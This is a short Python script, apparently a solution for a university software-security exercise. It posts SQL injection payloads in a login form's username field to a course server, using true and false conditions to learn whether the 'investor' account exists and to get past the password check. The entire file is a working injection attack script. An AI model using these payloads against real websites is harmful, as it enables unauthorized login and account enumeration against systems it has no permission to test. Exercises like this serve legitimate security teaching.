import requests

Server = 'http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt'
session = requests.session()

# Default account investor
false_query = "investor'and 1=0 -- "
password = "does not matter"

params = {'username' : false_query, 'password' : password }
r = session.post(Server + '/login', data=params)

assert "invalid" in r.text

injective_query = "investor'and 1=1 -- "
params = {'username' : injective_query, 'password' : password }
r = session.post(Server + '/login', data=params)

if("Welcome" in r.text):
    print("User exists")
else:
    print("User does not exits")
